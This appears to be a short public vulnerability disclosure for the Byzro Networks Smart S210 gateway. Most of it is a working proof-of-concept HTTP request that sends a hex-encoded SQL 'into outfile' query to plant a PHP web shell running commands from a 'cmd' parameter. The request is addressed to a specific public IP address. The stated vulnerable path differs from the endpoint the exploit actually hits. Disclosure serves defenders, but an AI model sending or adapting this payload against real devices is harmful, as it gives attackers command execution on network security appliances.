There is an RCE vulnerability in the intelligent management platform of Byzro Networks Smart S210 multi-service security gateway.

Vulnerability location:/Tool/repair.php

version：S210

1. The login interface is as shown in the figure.

![image](https://github.com/houhuidong/cve/assets/151603975/0a377256-1af0-4107-bdcf-fbb585a5130a)

2. Execute the SQL statement and write it to the shell.

POC
```
POST /Tool/querysql.php HTTP/1.1
Host: 183.248.30.228:8443
Cookie: PHPSESSID=5a4269a2368b45aeea8b49e0ffefde42
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 113

txt=select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/home/cont.php'
```
![image](https://github.com/houhuidong/cve/assets/151603975/11166cc5-9828-42ec-a95d-0fce22e1e4fe)

Then execute the poc:

![image](https://github.com/houhuidong/cve/assets/151603975/47d91c29-ffd9-41e8-8c25-5f44c194ecbd)

